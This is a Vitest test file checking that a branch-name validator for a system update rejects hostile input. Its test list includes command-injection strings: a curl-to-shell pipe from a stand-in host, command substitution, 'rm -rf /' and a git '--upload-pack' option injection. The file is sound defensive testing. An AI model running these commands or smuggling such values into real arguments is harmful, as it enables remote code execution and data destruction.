import { describe, expect, it } from "vitest";
import { normalizeUpdateBranch } from "./satellite.js";

describe("system.update branch validation", () => {
  it("defaults to main and accepts ordinary ref names", () => {
    expect(normalizeUpdateBranch(undefined)).toBe("main");
    expect(normalizeUpdateBranch("feat/saas-clerk-neon")).toBe("feat/saas-clerk-neon");
    expect(normalizeUpdateBranch("release-1.2.3")).toBe("release-1.2.3");
  });

  it.each([
    "main; curl evil.sh | sh",
    "$(id)",
    "`id`",
    "main && rm -rf /",
    "--upload-pack=evil",
    "-x",
    "a..b",
    "a b",
    "main|x",
    "branch.lock",
  ])("rejects %j", (branch) => {
    expect(() => normalizeUpdateBranch(branch)).toThrow(/invalid branch name/);
  });

  it("rejects non-strings", () => {
    expect(() => normalizeUpdateBranch({})).toThrow(/must be a string/);
  });
});
